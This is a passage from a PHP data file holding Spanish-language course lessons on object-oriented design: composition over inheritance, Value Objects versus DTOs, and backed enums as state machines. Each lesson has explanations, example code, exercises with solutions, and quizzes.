                            'explanation' => 'El modelo anémico viola la encapsulación: al exponer getters y setters universales, cualquier parte del sistema puede corromper el estado del objeto sin que la entidad pueda evitarlo.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Qué principio de diseño promueve la máxima "Tell, Don\'t Ask" (Dile al objeto, no le preguntes)?',
                            'options' => [
                                'a' => 'Pedir datos a un objeto con getters, procesarlos fuera y setearlos de vuelta.',
                                'b' => 'Ordenar al objeto que ejecute una operación de negocio con sus propios datos, delegándole la responsabilidad de salvaguardar su estado.',
                                'c' => 'Usar reflection para leer variables privadas sin invocar métodos.',
                                'd' => 'Obligar a que todos los métodos retornen arrays asociativos.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Tell, Don\'t Ask recuerda que la lógica que opera sobre los datos debe residir junto a los datos en la propia clase, en lugar de extraerlos para operar externamente.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Por qué un constructor privado acompañado de Named Constructors (métodos estáticos de fabricación) es una práctica Senior recomendada?',
                            'options' => [
                                'a' => 'Porque hace que la clase sea automáticamente un Singleton.',
                                'b' => 'Porque comunica explícitamente la intención de creación (ej. BankAccount::open() vs BankAccount::reconstitute()), previene instancias a medio inicializar y centraliza validaciones semánticas.',
                                'c' => 'Porque acelera el autoloader de Composer en un 40%.',
                                'd' => 'Porque evita tener que escribir la palabra new en todo el proyecto.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Los constructores nombrados aportan expresividad semántica al código y permiten tener múltiples formas controladas de instanciar un objeto garantizando que siempre nazca en un estado 100% válido.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 2: LECCIÓN 2: Composition over Inheritance
            // ==========================================
            'poo-composition-over-inheritance' => [
                'slug' => 'poo-composition-over-inheritance',
                'title' => 'Composition over Inheritance en la Práctica',
                'module' => 'POO & Modelado',
                'minutes' => 45,
                'difficulty' => 'Avanzado',
                'overview' => [
                    'concept' => 'El principio "Favor composition over inheritance" (Prefiere composición sobre herencia) es uno de los axiomas fundamentales del diseño orientado a objetos senior. La herencia crea el acoplamiento más fuerte posible entre dos clases (acoplamiento estático en tiempo de compilación y de caja blanca). La composición, en cambio, ensambla comportamiento en tiempo de ejecución inyectando colaboradores a través de contratos (interfaces).',
                    'problem' => 'En sistemas con jerarquías profundas de herencia (BaseController -> CrudController -> UserController), modificar la clase base rompe subclases inesperadamente (el infame "Fragile Base Class Problem"). Además, la herencia única de PHP obliga a arrastrar métodos que la clase hija no necesita, violando el Principio de Segregación de Interfaces (ISP) y la sustitución de Liskov (LSP). El abuso de traits agrava el problema al actuar como un copiar y pegar invisible sin contratos formales.',
                    'solution' => 'Modelar mediante Composición y Patrones de Comportamiento (Strategy, Decorator, Adapter). En lugar de que PricingEngine herede de BasePricing, recibe colaboradores que implementan DiscountStrategyInterface. Cada clase tiene una única responsabilidad (SRP), es testeable de forma aislada y el comportamiento puede ampliarse sin tocar el código existente (Principio Open/Closed).',
                    'problem_label' => 'El Problema de la Clase Base Frágil:',
                    'solution_label' => 'La Solución: Composición y Strategy Pattern:',
                ],
                'internals' => [
                    'title' => 'Mecánica Interna: Fragile Base Class vs Composición Dinámica',
                    'steps' => [
                        [
                            'phase' => '1. El Problema de la Clase Base Frágil',
                            'description' => 'Alterar un método protegido en BaseService puede cambiar sutilmente el comportamiento de 30 clases hijas en producción sin advertencias del compilador ni del linter.',
                        ],
                        [
                            'phase' => '2. Violación del Principio de Sustitución de Liskov (LSP)',
                            'description' => 'Si una clase hija sobrescribe un método para arrojar una excepción porque "no soporta esa operación", se destruye la garantía de sustitución polimórfica.',
                        ],
                        [
                            'phase' => '3. El peligro de los Traits como "Herencia Disfrazada"',
                            'description' => 'Los traits introducen dependencias ocultas, ensucian el análisis estático de PHPStan y no admiten tipado en constructores. Un Senior prefiere inyectar un colaborador antes que usar un trait con lógica de negocio.',
                        ],
                        [
                            'phase' => '4. Composición con Interfaces e Inyección de Dependencias',
                            'description' => 'Al inyectar una interfaz (DiscountStrategyInterface), podemos intercambiar la lógica en tiempo de ejecución o mediante la configuración de servicios de Symfony.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Pricing/PricingEngine.php',
                    'title' => 'Motor de Precios Desacoplado mediante Strategy Pattern',
                    'tag' => 'GoF Strategy Pattern',
                    'code' => "declare(strict_types=1);

namespace App\Pricing;

interface DiscountStrategyInterface
{
    public function applyDiscount(int \$subtotalCents): int;
}

class VipDiscountStrategy implements DiscountStrategyInterface
{
    public function __construct(private readonly float \$percentage = 0.15) {}

    public function applyDiscount(int \$subtotalCents): int
    {
        return (int) round(\$subtotalCents * (1 - \$this->percentage));
    }
}

class WholesaleDiscountStrategy implements DiscountStrategyInterface
{
    public function applyDiscount(int \$subtotalCents): int
    {
        return \$subtotalCents >= 50000 ? (int) round(\$subtotalCents * 0.80) : \$subtotalCents;
    }
}

readonly class PricingEngine
{
    /**
     * @param iterable<DiscountStrategyInterface> \$strategies
     */
    public function __construct(
        private iterable \$strategies
    ) {}

    public function calculateFinalPrice(int \$subtotalCents): int
    {
        \$currentPrice = \$subtotalCents;
        foreach (\$this->strategies as \$strategy) {
            \$currentPrice = \$strategy->applyDiscount(\$currentPrice);
        }

        return max(0, \$currentPrice);
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior analiza las relaciones "ES-UN" (is-a) frente a "TIENE-UN" (has-a) o "HACE-UN" (can-do). Rara vez una entidad o servicio en el mundo real tiene una relación "is-a" pura y perenne. Por ejemplo, un AdminUser no debería heredar de User; un User tiene una colección de Roles o Permisos (composición). La herencia se reserva estrictamente para contratos polimórficos de frameworks o extensiones cerradas.',
                    'critical_questions' => [
                        '¿Por qué estamos heredando de esta clase? ¿Para reutilizar código compartido o por polimorfismo genuino?',
                        '¿Si la clase base cambia un método protegido, sabemos con certeza matemática qué subclases se verán afectadas?',
                        '¿Estamos utilizando un trait simplemente para evitar inyectar una clase como servicio en el contenedor DI?',
                        '¿Podríamos reemplazar esta clase abstracta con una interfaz y delegar el comportamiento a un colaborador inyectado?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Diseñar un calculador de descuentos para clientes (Standard, VIP, Mayorista, Corporativo).',
                    'junior' => [
                        'approach' => 'Crea AbstractPricingEngine con lógica base y hereda VipPricingEngine, WholesalePricingEngine. Cuando un cliente es VIP y a la vez compra por volumen mayorista, crea una tercera subclase VipWholesalePricingEngine o duplica código.',
                        'flaws' => [
                            'Explosión combinatoria de subclases: cada combinación de reglas comerciales exige una nueva clase en la jerarquía.',
                            'Cualquier cambio en la clase base abstracta obliga a retestear todas las subclases derivadas.',
                            'Imposible alternar estrategias dinámicamente según promociones temporales (ej. Black Friday) sin reinstanciar objetos completos.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Define DiscountStrategyInterface con método applyDiscount(int $subtotalCents): int. Implementa estrategias atómicas (VipDiscountStrategy, WholesaleDiscountStrategy). El PricingEngine recibe una lista tipada iterable<DiscountStrategyInterface> y las evalúa mediante composición.',
                        'rationale' => [
                            'Cumplimiento estricto de Open/Closed: añadir una nueva promoción no requiere tocar ni una sola línea de PricingEngine.',
                            'Cada estrategia se testea unitariamente en 5 líneas de código con datos puros.',
                            'Permite encadenar múltiples descuentos de manera modular y configurable.',
                        ],
                        'trade_offs' => 'Genera más clases y archivos pequeños en el proyecto, requiriendo un contenedor DI o un factory para ensamblarlos.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Motor de Descuentos por Composición (Strategy Pattern)',
                    'objective' => 'Implementar un motor de cálculo de precios (PricingEngine) que reciba estrategias mediante composición sin utilizar herencia (extends).',
                    'instructions' => 'Define DiscountStrategyInterface con método applyDiscount(int $subtotalCents): int, implementa la estrategia VipDiscountStrategy (aplica 15% de descuento) y la clase PricingEngine con calculateFinalPrice() que aplique la estrategia inyectada sin herencia.',
                    'filename' => 'PricingEngine.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\n// TODO 1: Definir DiscountStrategyInterface con el método applyDiscount(int \$subtotalCents): int\n\n// TODO 2: Implementar VipDiscountStrategy aplicando un 15% de descuento\n\n// TODO 3: Implementar PricingEngine recibiendo DiscountStrategyInterface en el constructor\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\ninterface DiscountStrategyInterface\n{\n    public function applyDiscount(int \$subtotalCents): int;\n}\n\nclass VipDiscountStrategy implements DiscountStrategyInterface\n{\n    public function applyDiscount(int \$subtotalCents): int\n    {\n        return (int) round(\$subtotalCents * 0.85);\n    }\n}\n\nreadonly class PricingEngine\n{\n    public function __construct(\n        private DiscountStrategyInterface \$strategy\n    ) {}\n\n    public function calculateFinalPrice(int \$subtotalCents): int\n    {\n        return max(0, \$this->strategy->applyDiscount(\$subtotalCents));\n    }\n}\n",
                    'explanation' => 'Al usar una interfaz inyectada en PricingEngine, eliminamos completamente la necesidad de clases base abstractas o extends. Para agregar nuevas reglas comerciales, simplemente creamos nuevas clases que implementan DiscountStrategyInterface.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Composición vs Herencia en PHP',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué es el "Fragile Base Class Problem" (Problema de la Clase Base Frágil)?',
                            'options' => [
                                'a' => 'Un error sintáctico cuando una clase base no tiene constructor.',
                                'b' => 'La situación donde una modificación en una clase base altera inesperadamente el comportamiento o introduce bugs en clases derivadas lejanas.',
                                'c' => 'Cuando una clase base ocupa más de 2MB en disco.',
                                'd' => 'Una incompatibilidad entre PHP 8.3 y PHP 8.4.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'La herencia acopla fuertemente las subclases a los detalles de implementación internos de la clase base. Un cambio aparentemente inocuo en la clase base puede romper contratos en subclases sin que el compilador avise.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué los traits NO son un reemplazo adecuado para la composición?',
                            'options' => [
                                'a' => 'Porque los traits son más lentos en ejecución que los arrays.',
                                'b' => 'Porque los traits actúan como una copia directa de código en tiempo de compilación sin contrato de interfaz, introduciendo dependencias ocultas y dificultando el testing aislado.',
                                'c' => 'Porque los traits no admiten visibilidad pública.',
                                'd' => 'Porque Symfony no soporta traits en absoluto.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Los traits copian métodos dentro de la clase que los usa. No son tipables en constructores, no desacoplan contratos y acoplan el código a métodos heredados implícitamente.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué principio SOLID se respeta principalmente al reemplazar una jerarquía de herencia por el patrón Strategy?',
                            'options' => [
                                'a' => 'Open/Closed Principle (OCP): el sistema está abierto a la extensión (nuevas estrategias) pero cerrado a la modificación.',
                                'b' => 'Single Sign-On (SSO).',
                                'c' => 'Database Normalization Principle.',
                                'd' => 'Direct Memory Access (DMA).',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Con el patrón Strategy, se agregan nuevos comportamientos simplemente creando nuevas clases que implementan la interfaz, sin alterar la clase consumidora.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 2: LECCIÓN 3: Value Objects vs DTOs vs Entidades
            // ==========================================
            'poo-value-objects-dtos' => [
                'slug' => 'poo-value-objects-dtos',
                'title' => 'Value Objects vs DTOs vs Entidades',
                'module' => 'POO & Modelado',
                'minutes' => 45,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'En arquitectura de software limpia y Domain-Driven Design (DDD), los objetos se dividen con precisión técnica en tres categorías fundamentales: Entidades (con identidad única y ciclo de vida mutable), Value Objects (inmutables, definidos puramente por sus atributos, sin identidad propia) y Data Transfer Objects (DTOs) (estructuras planas para transportar datos entre capas sin lógica de negocio).',
                    'problem' => 'La epidemia de la "Primitive Obsession" (Obsesión por los Tipos Primitivos): los desarrolladores usan string para representar emails, URLs, IBANs, DNIs o códigos postales, y float o int para dinero. Como consecuencia, las validaciones de formato se repiten en decenas de controladores, se permite accidentalmente sumar dólares con euros, y un float con valor 0.1 + 0.2 resulta en 0.30000000000000004, corrompiendo cierres contables en producción.',
                    'solution' => 'Encapsular conceptos de dominio en Value Objects inmutables con PHP 8.2+ (readonly class Money, readonly class Email). Un Value Object valida sus invariantes en el constructor, no puede cambiar una vez creado, implementa igualdad estructural ($a->equals($b)), y provee operaciones que retornan nuevas instancias inmutables ($money->add($other)).',
                    'problem_label' => 'El Peligro de la Primitive Obsession:',
                    'solution_label' => 'La Solución: Value Objects Inmutables:',
                ],
                'internals' => [
                    'title' => 'Comparativa y Mecánica Interna de los Bloques de Modelado',
                    'steps' => [
                        [
                            'phase' => '1. Entidad vs Value Object',
                            'description' => 'Dos usuarios con el mismo nombre y email son personas distintas (identidad por ID: $u1->id !== $u2->id). Dos billetes de $20 dólares son indistinguibles e intercambiables (igualdad estructural: $m1->equals($m2)). Si cambias un número en un billete, no mutaste el billete; es un valor diferente.',
                        ],
                        [
                            'phase' => '2. DTO (Data Transfer Object)',
                            'description' => 'Un DTO (CreateUserRequest, InvoiceExportDto) solo cruza fronteras arquitectónicas (HTTP, CLI, APIs externas). No contiene reglas de negocio complejas; solo campos tipados y validaciones superficiales de formato.',
                        ],
                        [
                            'phase' => '3. Inmutabilidad Absoluta con readonly class',
                            'description' => 'En PHP 8.2+, declarar una clase readonly congela todas sus propiedades. Evita que cualquier código mute el valor subyacente por referencia, previniendo efectos secundarios (Side Effects) en cascada.',
                        ],
                        [
                            'phase' => '4. El peligro mortal de los Floats en Finanzas',
                            'description' => 'El estándar binario IEEE 754 de coma flotante no puede representar fracciones decimales exactas como 0.1 o 0.7 en base 2. Un Value Object Money almacena el valor como entero en centavos (int $cents) o usa la extensión bcmath, garantizando precisión contable absoluta.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Domain/ValueObject/Money.php',
                    'title' => 'Value Object Money Inmutable con Operaciones de Dominio',
                    'tag' => 'DDD Immutable Value Object',
                    'code' => "declare(strict_types=1);

namespace App\Domain\ValueObject;

use InvalidArgumentException;

readonly class Money
{
    public function __construct(
        public int \$cents,
        public string \$currency = 'EUR'
    ) {
        if (\$this->cents < 0) {
            throw new InvalidArgumentException('El monto monetario no puede ser negativo.');
        }
        if (strlen(\$this->currency) !== 3) {
            throw new InvalidArgumentException('La divisa debe ser un código ISO 4217 de 3 letras (ej. EUR, USD).');
        }
    }

    public static function fromMajor(float \$amount, string \$currency = 'EUR'): self
    {
        return new self((int) round(\$amount * 100), strtoupper(\$currency));
    }

    public function add(self \$other): self
    {
        \$this->assertSameCurrency(\$other);

        return new self(\$this->cents + \$other->cents, \$this->currency);
    }

    public function subtract(self \$other): self
    {
        \$this->assertSameCurrency(\$other);
        if (\$other->cents > \$this->cents) {
            throw new InvalidArgumentException('No se permiten saldos monetarios negativos.');
        }

        return new self(\$this->cents - \$other->cents, \$this->currency);
    }

    public function equals(self \$other): bool
    {
        return \$this->cents === \$other->cents && \$this->currency === \$other->currency;
    }

    private function assertSameCurrency(self \$other): void
    {
        if (\$this->currency !== \$other->currency) {
            throw new InvalidArgumentException(sprintf(
                'Conflicto de divisas: No es posible operar entre %s y %s.',
                \$this->currency,
                \$other->currency
            ));
        }
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Cuando un Senior revisa la firma function chargeCustomer(int $userId, float $amount, string $currency), siente alarma inmediata. ¿El amount está en dólares o centavos? ¿La currency está en formato ISO 4217? ¿Qué pasa si pasan un float negativo? Un Senior refactoriza a function chargeCustomer(UserId $userId, Money $amount). El compilador de PHP y el sistema de tipos ahora impiden físicamente cometer errores de negocio en tiempo de desarrollo.',
                    'critical_questions' => [
                        '¿Este objeto tiene ciclo de vida e historial en base de datos (Entidad) o es simplemente un valor intercambiable (Value Object)?',
                        '¿Estamos modelando conceptos monetarios con float en lugar de enteros en centavos o BCMath?',
                        '¿El DTO está filtrando lógica de negocio que debería pertenecer al dominio o a la entidad?',
                        '¿La igualdad de este objeto depende de su ID primario en base de datos o de todos sus valores internos?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Procesar el cobro y división de un pago con múltiples divisas y comisiones en un marketplace.',
                    'junior' => [
                        'approach' => 'Trabaja con arrays asociativos: [\'amount\' => 100.50, \'currency\' => \'USD\']. Suma directamente con $total = $cart[\'amount\'] + $tax[\'amount\']. En un controlador divide $total / 3 y redondea con round($part, 2).',
                        'flaws' => [
                            'Error de centavo perdido: Al dividir 100 entre 3 da 33.33 x 3 = 99.99, perdiendo 1 centavo en el limbo contable.',
                            'Riesgo de sumar montos de distintas monedas: $total = 100 (USD) + 50 (EUR) da 150 sin ninguna advertencia del lenguaje.',
                            'Tipos flotantes introducen desvíos numéricos acumulativos con millones de transacciones.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Value Object Money inmutable. Valida monedas idénticas en add() y subtract(), lanzando CurrencyMismatchException si difieren. Para divisiones de pagos implementa almacenamiento estricto en centavos enteros.',
                        'rationale' => [
                            'La suma de las partes siempre es exactamente igual al total, con cero centavos perdidos.',
                            'Garantía estática de integridad de divisas en tiempo de compilación y ejecución.',
                            'Código reutilizable en facturación, carritos, reportes y pasarelas de pago.',
                        ],
                        'trade_offs' => 'Ligeramente más verboso que operar con primitivos directos. Requiere convertir tipos en la capa de persistencia (Doctrine Embeddables o DBAL Custom Types).',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Value Object Money Inmutable con Verificación de Divisas',
                    'objective' => 'Construir un Value Object Money inmutable en PHP 8.4 con manejo de centavos (enteros), validación de divisa ISO 4217 y métodos add() y equals().',
                    'instructions' => 'Implementa readonly class Money asegurando declare(strict_types=1);, almacenamiento en centavos (int $cents), código de moneda (string $currency), validación contra monedas diferentes (\InvalidArgumentException) y método equals().',
                    'filename' => 'Money.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nreadonly class Money\n{\n    public function __construct(\n        public int \$cents,\n        public string \$currency = 'EUR'\n    ) {\n        // TODO: Validar que \$cents no sea negativo\n    }\n\n    public function add(self \$other): self\n    {\n        // TODO: Validar que \$other tenga la misma divisa (lanzar InvalidArgumentException si difiere) y retornar nuevo Money\n    }\n\n    public function equals(self \$other): bool\n    {\n        // TODO: Retornar true si coinciden centavos y moneda\n        return false;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nreadonly class Money\n{\n    public function __construct(\n        public int \$cents,\n        public string \$currency = 'EUR'\n    ) {\n        if (\$this->cents < 0) {\n            throw new InvalidArgumentException('El monto no puede ser negativo.');\n        }\n    }\n\n    public function add(self \$other): self\n    {\n        if (\$this->currency !== \$other->currency) {\n            throw new InvalidArgumentException('No se pueden sumar montos de diferentes monedas.');\n        }\n\n        return new self(\$this->cents + \$other->cents, \$this->currency);\n    }\n\n    public function equals(self \$other): bool\n    {\n        return \$this->cents === \$other->cents && \$this->currency === \$other->currency;\n    }\n}\n",
                    'explanation' => 'Un Value Object es inmutable: nunca modifica sus propiedades internas. Las operaciones como add() retornan una nueva instancia calculada, protegiendo al sistema contra efectos secundarios no deseados.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Value Objects, DTOs y Entidades',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la diferencia primordial entre una Entidad y un Value Object?',
                            'options' => [
                                'a' => 'Una Entidad se almacena en base de datos; un Value Object solo existe en JavaScript.',
                                'b' => 'Una Entidad tiene identidad única continua a lo largo del tiempo ($a->id === $b->id); un Value Object no tiene identidad y su igualdad es puramente estructural según sus atributos.',
                                'c' => 'Los Value Objects siempre son mutables y las Entidades no.',
                                'd' => 'Una Entidad no puede contener métodos.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Dos Entidades son iguales solo si comparten la misma identidad (ID). Dos Value Objects son iguales si todos sus atributos son idénticos, sin importar dónde o cuándo se crearon.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué la Primitive Obsession es considerada un antipatrón en código Senior?',
                            'options' => [
                                'a' => 'Porque el uso de float y string crudos para conceptos de dominio (como dinero o emails) dispersa validaciones y permite errores lógicos que el compilador no puede atrapar.',
                                'b' => 'Porque los tipos primitivos fueron deprecados en PHP 8.0.',
                                'c' => 'Porque consume más memoria RAM que las clases readonly.',
                                'd' => 'Porque MySQL no soporta tipos escalares.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Usar tipos primitivos impide que el sistema de tipos nos proteja contra errores semánticos, como sumar dólares con yenes o pasar un string mal formateado como email.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Por qué el cálculo financiero con el tipo float es inaceptable en sistemas bancarios y e-commerce?',
                            'options' => [
                                'a' => 'Porque los floats se redondean automáticamente a enteros en PHP.',
                                'b' => 'Porque la representación binaria IEEE 754 de números de coma flotante introduce inexactitudes de redondeo inevitables (ej. 0.1 + 0.2 != 0.3).',
                                'c' => 'Porque la base de datos MySQL rechaza consultas que incluyan floats.',
                                'd' => 'Porque los procesadores x86 no tienen unidad de punto flotante.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Los números de punto flotante en computación están sujetos a imprecisiones de representación binaria. En sistemas financieros se debe operar con enteros en la menor unidad (centavos) o bibliotecas de precisión arbitraria (BCMath).',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 2: LECCIÓN 4: PHP Enums como Máquinas de Estado Seguras
            // ==========================================
            'poo-enums-state-machines' => [
                'slug' => 'poo-enums-state-machines',
                'title' => 'PHP Enums como Máquinas de Estado Seguras',
                'module' => 'POO & Modelado',
                'minutes' => 35,
                'difficulty' => 'Avanzado',
                'overview' => [
                    'concept' => 'Desde PHP 8.1, los Enums (Enumeraciones) son ciudadanos de primera clase en el lenguaje: son tipos cerrados, pueden tener valores de respaldo (Backed Enums: int o string), implementar interfaces, contener métodos, y trabajar en conjunción con la expresión match para garantizar verificación exhaustiva (Exhaustiveness Checking). Son la herramienta por excelencia para modelar Máquinas de Estado Finito (FSM) seguras en el dominio.',
                    'problem' => 'Históricamente en PHP, los estados de una entidad (\'pending\', \'approved\', \'rejected\', \'cancelled\') se manejaban con strings mágicos o constantes de clase (OrderStatus::PENDING). Esto permitía transiciones ilegales invisibles (ejemplo: cambiar un pedido de \'cancelled\' a \'delivered\'), obligaba a escribir enormes y frágiles cadenas de switch o if/else, y si se agregaba un estado nuevo, el sistema no advertía los lugares donde faltaba contemplarlo.',
                    'solution' => 'Diseñar Backed Enums con métodos de dominio que definan la Máquina de Estados Finito. El Enum centraliza la matriz de transiciones válidas (canTransitionTo()), provee métodos de consulta semántica (isTerminal(), requiresPayment()), y el tipado estricto impide que cualquier código asigne un valor arbitrario. Si se añade un nuevo caso al Enum, PHPStan o match alertan inmediatamente si algún escenario quedó sin cubrir.',
                    'problem_label' => 'El Problema de Strings Mágicos y Estados Corruptos:',
                    'solution_label' => 'La Solución: Backed Enums como Máquina de Estados:',
                ],
                'internals' => [
                    'title' => 'Mecánica de los Enums, Backed Enums y Máquinas de Estado',
                    'steps' => [
                        [
                            'phase' => '1. Pure Enums vs Backed Enums',
                            'description' => 'Los Pure Enums son instancias singleton sin valor escalar subyacente. Los Backed Enums (enum Status: string) serializan a strings o enteros para persistencia en MySQL (Status::from(\'paid\') o Status::tryFrom(\'unknown\')).',
                        ],
                        [
                            'phase' => '2. Métodos de Transición de Estado',
                            'description' => 'Los Enums pueden contener métodos. Al encapsular public function canTransitionTo(self $target): bool dentro del Enum, las reglas de la máquina de estados quedan unificadas en un único punto de verdad.',
                        ],
                        [
                            'phase' => '3. Verificación Exhaustiva con match',
                            'description' => 'Al usar match ($this) sobre un Enum sin default, el Zend Engine garantiza que todos los casos están cubiertos. Si olvidas un caso, lanza un UnhandledMatchError inmediato, previniendo estados no considerados.',
                        ],
                        [
                            'phase' => '4. Integración Limpia con Doctrine y Formularios',
                            'description' => 'Symfony y Doctrine ORM 3 mapean directamente Backed Enums como columnas en base de datos de manera nativa sin necesidad de transformadores manuales ni listeners complejos.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Domain/Enum/OrderStatus.php',
                    'title' => 'Máquina de Estados Finitos en un Backed Enum',
                    'tag' => 'PHP 8.4 Backed Enum FSM',
                    'code' => "declare(strict_types=1);

namespace App\Domain\Enum;

use DomainException;

enum OrderStatus: string
{
    case Draft = 'draft';
    case Paid = 'paid';
    case Shipped = 'shipped';
    case Delivered = 'delivered';
    case Cancelled = 'cancelled';

    public function canTransitionTo(self \$target): bool
    {
        return match (\$this) {
            self::Draft => in_array(\$target, [self::Paid, self::Cancelled], true),
            self::Paid => in_array(\$target, [self::Shipped, self::Cancelled], true),
            self::Shipped => \$target === self::Delivered,
            self::Delivered, self::Cancelled => false,
        };
    }

    public function transitionTo(self \$target): self
    {
        if (!\$this->canTransitionTo(\$target)) {
            throw new DomainException(sprintf(
                'Transición de estado inválida: No es posible cambiar de %s a %s.',
                \$this->value,
                \$target->value
            ));
        }

        return \$target;
    }

    public function isTerminal(): bool
    {
        return match (\$this) {
            self::Delivered, self::Cancelled => true,
            default => false,
        };
    }

    public function badgeColor(): string
    {
        return match (\$this) {
            self::Draft => '#858585',
            self::Paid => '#4fc1ff',
            self::Shipped => '#dcdcaa',
            self::Delivered => '#89d185',
            self::Cancelled => '#f14c4c',
        };
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior nunca confía en strings libres en la base de datos o en validaciones de formulario para controlar el ciclo de vida de una entidad. Se pregunta: ¿Qué estados son terminales? ¿Se puede cancelar un pedido una vez enviado? ¿Quién gobierna las transiciones? Al poner la máquina de estados en el Enum, la entidad delega la validación de transición a $this->status->canTransitionTo($newStatus), imposibilitando estados zombies o transiciones corruptas.',
                    'critical_questions' => [
                        '¿Todos los estados posibles de este proceso de negocio están tipados en un Backed Enum?',
                        '¿Estamos usando tryFrom() con manejo de nulos o from() que arroja ValueError ante valores corruptos de base de datos?',
                        '¿Existe alguna rama de código que pueda dejar a la entidad en un estado terminal y luego reactivarla sin control?',
                        '¿Nuestros match statements tienen cláusulas default perezosas que ocultan nuevos casos cuando el enum crece?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Administrar los estados del ciclo de vida de un pedido de e-commerce (Draft -> Paid -> Shipped -> Delivered o Cancelled).',
                    'junior' => [
                        'approach' => 'Usa constantes de clase: const STATUS_PAID = \'paid\';. En los controladores hace: $order->setStatus(Order::STATUS_DELIVERED); $em->flush(); sin validar en qué estado previo se encontraba el pedido.',
                        'flaws' => [
                            'Un cliente con pedido cancelado puede recibir su paquete si un endpoint de webhook de logística actualiza el estado a \'delivered\' ciegamente.',
                            'Strings mágicos propensos a typos (\'canceled\' con una L vs \'cancelled\' con dos L).',
                            'No hay noción de estados terminales ni advertencias si se agrega un nuevo estado al flujo.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Backed Enum OrderStatus: string con matriz de transiciones formal. La entidad Order expone métodos semánticos (ship(), cancel()) que invocan $this->status->transitionTo(OrderStatus::Shipped). Si la transición es inválida, se lanza IllegalStateTransitionException.',
                        'rationale' => [
                            'Imposible corromper el ciclo de vida de un pedido, sin importar qué controlador, comando de consola o worker invoque la operación.',
                            'Código 100% autovalidante y expresivo.',
                            'Integración nativa con Doctrine ORM y serialización JSON transparente.',
                        ],
                        'trade_offs' => 'Si el grafo de la máquina de estados es extremadamente dinámico y configurable por el usuario final en tiempo de ejecución (ej. un Jira donde el cliente diseña sus propios flujos), se requeriría un motor de workflow como Symfony Workflow Component. Para dominios cerrados con reglas bien definidas, los Enums nativos son la solución más elegante y con mejor rendimiento.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Máquina de Estados Finitos con Backed Enums',
                    'objective' => 'Implementar un Backed Enum OrderStatus: string que actúe como una máquina de estados con métodos canTransitionTo() e isTerminal().',
                    'instructions' => 'Crea el enum OrderStatus: string con los casos Draft = \'draft\', Paid = \'paid\', Shipped = \'shipped\', Delivered = \'delivered\', Cancelled = \'cancelled\'. Implementa canTransitionTo(self $target): bool y el método isTerminal(): bool asegurando que Delivered y Cancelled sean terminales.',
                    'filename' => 'OrderStatus.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nenum OrderStatus: string\n{\n    case Draft = 'draft';\n    case Paid = 'paid';\n    case Shipped = 'shipped';\n    case Delivered = 'delivered';\n    case Cancelled = 'cancelled';\n\n    public function canTransitionTo(self \$target): bool\n    {\n        // TODO: Retorna true solo para transiciones válidas:\n        // Draft -> Paid o Cancelled\n        // Paid -> Shipped o Cancelled\n        // Shipped -> Delivered\n        // Delivered y Cancelled no pueden transicionar a ningún estado\n        return false;\n    }\n\n    public function isTerminal(): bool\n    {\n        // TODO: Retornar true si el estado es Delivered o Cancelled\n        return false;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nenum OrderStatus: string\n{\n    case Draft = 'draft';\n    case Paid = 'paid';\n    case Shipped = 'shipped';\n    case Delivered = 'delivered';\n    case Cancelled = 'cancelled';\n\n    public function canTransitionTo(self \$target): bool\n    {\n        return match (\$this) {\n            self::Draft => in_array(\$target, [self::Paid, self::Cancelled], true),\n            self::Paid => in_array(\$target, [self::Shipped, self::Cancelled], true),\n            self::Shipped => \$target === self::Delivered,\n            self::Delivered, self::Cancelled => false,\n        };\n    }\n\n    public function isTerminal(): bool\n    {\n        return match (\$this) {\n            self::Delivered, self::Cancelled => true,\n            default => false,\n        };\n    }\n}\n",
